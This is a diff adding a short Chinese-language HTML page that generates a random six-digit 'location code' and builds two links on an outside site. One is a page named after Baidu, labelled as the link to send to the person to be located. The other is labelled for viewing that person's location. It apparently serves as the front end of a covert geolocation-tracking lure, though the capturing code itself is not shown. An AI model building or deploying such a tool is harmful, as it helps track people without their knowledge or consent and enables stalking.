@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>生成连接</title>
+</head>
+<script>
+    function huoqunum(){
+        var num="";
+        for(var i=0;i<6;i++){
+            num+=Math.floor(Math.random()*10);
+        }
+        document.getElementById("yzm").value=num;
+        // document.getElementById("huoquwang").innerHTML="http://www.zhaoxiao.vip/myssmapp/baidu.html?num="+num;
+        // document.getElementById("getlocation").innerHTML="http://www.zhaoxiao.vip/myssmapp/getlocation.html?num="+num;
+        document.getElementById("huoquwang").innerHTML="http://www.zhaoxiao.vip/ssmapp/baidu.html?num="+num;
+        document.getElementById("getlocation").innerHTML="http://www.zhaoxiao.vip/ssmapp/getlocation.html?num="+num;
+        document.getElementById("sava").href="http://www.zhaoxiao.vip/ssmapp/baidu.html?num="+num;
+        document.getElementById("get").href="http://www.zhaoxiao.vip/ssmapp/getlocation.html?num="+num;
+    }
+</script>
+<body>
+        定位码：<input type="text" value="" name="yanzhengma" id="yzm">
+       <input type="button" value="获取定位码" onclick="huoqunum()"><br>
+        发送你要定位的网址：<a id="sava" href="http://www.zhaoxiao.vip/ssmapp"><p id="huoquwang"></p></a>
+        查看定位：<a id="get" href="http://www.zhaoxiao.vip/ssmapp"><p id="getlocation"></p></a>
+</body>
+</html>
